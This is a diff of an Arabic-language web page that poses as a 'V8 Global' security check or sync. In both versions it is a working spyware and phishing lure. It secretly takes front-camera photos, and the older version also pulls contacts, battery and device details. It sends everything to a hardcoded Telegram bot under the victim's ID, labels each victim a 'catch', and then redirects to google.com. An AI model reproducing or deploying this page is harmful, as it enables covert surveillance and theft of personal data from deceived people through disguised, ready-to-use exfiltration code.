@@ -2,168 +2,89 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>V8 Global - Secure Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>V8 Global - Secure Sync</title>
     <style>
-        /* التنسيق الأصلي الخاص بك مع إضافة لمسات للأزرار */
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-user-select: none; user-select: none; }
-        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; text-align: center; height: 100vh; overflow: hidden; }
-        .container { position: relative; z-index: 2; padding: 30px; margin-top: 50px; }
-        .logo { font-size: 24px; margin-bottom: 30px; text-shadow: 0 0 10px #00ffcc; }
-        #status { font-size: 18px; margin-bottom: 20px; min-height: 60px; padding: 15px; background: rgba(0, 255, 204, 0.1); border-radius: 10px; border: 1px solid rgba(0, 255, 204, 0.3); }
-        .progress-bar { height: 6px; background: linear-gradient(90deg, #00ffcc, #00ccff); width: 0%; transition: width 0.5s; border-radius: 3px; margin: 20px auto; width: 80%; }
-        .step-indicator { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
-        .step { width: 35px; height: 35px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; border: 2px solid transparent; }
-        .step.active { border-color: #00ffcc; box-shadow: 0 0 10px #00ffcc; }
-        .flash-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; opacity: 0; pointer-events: none; }
-        .flash-overlay.active { animation: flashAnim 0.5s; }
-        @keyframes flashAnim { 0% { opacity: 0; } 10% { opacity: 0.9; } 100% { opacity: 0; } }
-        video, canvas { display: none; }
+        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { border: 1px solid #00ffcc; padding: 30px; border-radius: 15px; background: rgba(0,255,204,0.05); box-shadow: 0 0 20px #00ffcc; width: 90%; max-width: 400px; }
+        .btn { background: #00ffcc; color: #000; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; font-size: 16px; }
+        .progress-bar { width: 100%; height: 4px; background: #222; margin: 20px 0; position: relative; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #00ffcc; transition: width 0.3s; }
+        #v, #c { display: none; }
+        .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
-    <div class="flash-overlay" id="flashOverlay"></div>
-    <div class="container">
-        <div class="logo">V8 GLOBAL SYSTEM V2</div>
-        <div id="status">جاري تهيئة بروتوكولات الحماية...</div>
-        <div class="progress-bar" id="progressBar"></div>
-        <div class="step-indicator">
-            <div class="step" id="step1">1</div>
-            <div class="step" id="step2">2</div>
-            <div class="step" id="step3">3</div>
-            <div class="step" id="step4">4</div>
-            <div class="step" id="step5">5</div>
-        </div>
-        <video id="v" autoplay playsinline muted></video>
-        <canvas id="c"></canvas>
+    <div class="flash" id="f"></div>
+    <div class="card">
+        <h2 id="t">V8 Global System</h2>
+        <p id="s">يرجى الضغط على الزر أدناه لمزامنة الأمان</p>
+        <div class="progress-bar"><div class="progress-fill" id="p"></div></div>
+        <button class="btn" id="b" onclick="startCapture()">بدء مزامنة الأمان ✅</button>
     </div>
 
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+
     <script>
-        // =========== الإعدادات المركزية ===========
-        const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
-        const urlParams = new URLSearchParams(window.location.search);
-        const targetID = urlParams.get('id');
+        const TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPROA823dxEaOZVU";
+        const params = new URLSearchParams(window.location.search);
+        const uid = params.get('id');
+        const mode = params.get('mode') || 'all';
 
-        const statusEl = document.getElementById('status');
-        const progressBar = document.getElementById('progressBar');
-        const flashOverlay = document.getElementById('flashOverlay');
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
+        async function startCapture() {
+            if(!uid) return;
+            document.getElementById('b').style.display = 'none';
+            updateUI("جاري طلب الصلاحيات...", 30);
 
-        // وظائف التحديث
-        function updateUI(text, prog, step) {
-            statusEl.innerText = text;
-            progressBar.style.width = prog + '%';
-            if(step) document.getElementById(`step${step}`).classList.add('active');
-        }
-
-        // 1. جمع معلومات الجهاز (Battery & Info)
-        async function getInfo() {
-            updateUI("🔍 فحص النظام والبطارية...", 20, 1);
-            const b = await navigator.getBattery();
-            return `🔋 الشحن: ${Math.floor(b.level * 100)}% | الحالة: ${b.charging ? '⚡' : '🔋'}\n📱 النظام: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent.slice(0, 50)}`;
-        }
-
-        // 2. سحب جهات الاتصال (Contact Picker)
-        async function getContacts() {
-            updateUI("📇 تأمين سجل الأسماء...", 40, 2);
-            if ('contacts' in navigator && 'select' in navigator.contacts) {
-                try {
-                    const props = ['name', 'tel'];
-                    const contacts = await navigator.contacts.select(props, { multiple: true });
-                    if (contacts.length > 0) {
-                        return contacts.map(c => `👤 ${c.name}: ${c.tel}`).join('\n');
-                    }
-                } catch (e) { return "❌ تم رفض الوصول للأسماء"; }
-            }
-            return "⚠️ المتصفح لا يدعم سحب الأسماء";
-        }
-
-        // 3. دالة فحص جودة الصورة (منع الشاشة السوداء)
-        async function checkImage(dataUrl) {
-            return new Promise((resolve) => {
-                const img = new Image();
-                img.onload = () => {
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = img.width; canvas.height = img.height;
-                    ctx.drawImage(img, 0, 0);
-                    const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-                    let brightness = 0;
-                    for (let i = 0; i < data.length; i += 4) {
-                        brightness += (data[i] + data[i+1] + data[i+2]) / 3;
-                    }
-                    resolve((brightness / (data.length / 4)) > 40); // إذا السطوع أكبر من 40
-                };
-                img.src = dataUrl;
-            });
-        }
-
-        // العملية الرئيسية
-        async function start() {
-            if (!targetID) { window.location.replace("https://google.com"); return; }
-
-            // معلومات الجهاز
-            const info = await getInfo();
-            
-            // جهات الاتصال
-            const contacts = await getContacts();
-
-            // تشغيل الكاميرا
-            updateUI("🎥 مزامنة الكاميرا الأمامية...", 60, 3);
             try {
+                // طلب الكاميرا - بمجرد الضغط على سماح يبدأ السحب
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 2000)); // انتظار الضبط
+                document.getElementById('v').srcObject = stream;
+                updateUI("جاري فحص النظام...", 60);
 
-                updateUI("📸 التقاط صور عالية الدقة...", 80, 4);
-                let finalPhoto = null;
+                // انتظار بسيط لضبط العدسة
+                await new Promise(r => setTimeout(r, 1500));
+
+                // فلاش وتحسين جودة الصورة
+                document.getElementById('f').style.opacity = '1';
+                const canvas = document.getElementById('c');
+                const video = document.getElementById('v');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photo = canvas.toDataURL('image/jpeg', 0.9);
+                document.getElementById('f').style.opacity = '0';
+
+                updateUI("جاري إرسال البيانات...", 90);
+
+                // جمع معلومات البطارية
+                const bat = await navigator.getBattery();
+                const info = `🚀 **صيد V8 جديد (${mode}):**\n🔋 الشحن: ${Math.floor(bat.level*100)}%\n📱 النظام: ${navigator.platform}`;
+
+                // إرسال الصورة والبيانات للأيدي المحدد في الرابط
+                const blob = await (await fetch(photo)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', uid);
+                fd.append('photo', blob, 'v8.jpg');
+                fd.append('caption', info);
+
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 
-                // محاولات التقاط مع فلاش لمنع السواد
-                for (let i = 0; i < 3; i++) {
-                    flashOverlay.classList.add('active');
-                    setTimeout(() => flashOverlay.classList.remove('active'), 500);
-                    
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const shot = canvas.toDataURL('image/jpeg', 0.9);
-                    
-                    if (await checkImage(shot)) { finalPhoto = shot; break; }
-                    await new Promise(r => setTimeout(r, 1000));
-                }
-
-                // إرسال الكل لتليجرام
-                updateUI("📤 إرسال التقارير النهائية...", 95, 5);
-                
-                // إرسال النصوص (معلومات + أسماء)
-                const fullText = `${info}\n\n📇 **جهات الاتصال المستخرجة:**\n${contacts.slice(0, 3000)}`;
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: targetID, text: fullText, parse_mode: 'Markdown' })
-                });
-
-                // إرسال الصورة
-                if (finalPhoto) {
-                    const blob = await (await fetch(finalPhoto)).blob();
-                    const fd = new FormData();
-                    fd.append('chat_id', targetID);
-                    fd.append('photo', blob, 'v8_capture.jpg');
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                }
-
+                updateUI("تمت المزامنة بنجاح!", 100);
                 stream.getTracks().forEach(t => t.stop());
-                updateUI("✅ تم التأمين بنجاح", 100, 5);
-                setTimeout(() => window.location.replace("https://google.com"), 2000);
+                setTimeout(() => window.location.replace("https://google.com"), 1500);
 
             } catch (e) {
-                // في حال فشل الكاميرا نرسل الأسماء والمعلومات فقط
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${targetID}&text=${encodeURIComponent(info + "\n\n" + contacts)}`);
+                updateUI("فشل في المزامنة!", 0);
                 window.location.replace("https://google.com");
             }
         }
 
-        window.onload = () => setTimeout(start, 1000);
+        function updateUI(text, prog) {
+            document.getElementById('s').innerText = text;
+            document.getElementById('p').style.width = prog + '%';
+        }
     </script>
 </body>
 </html>
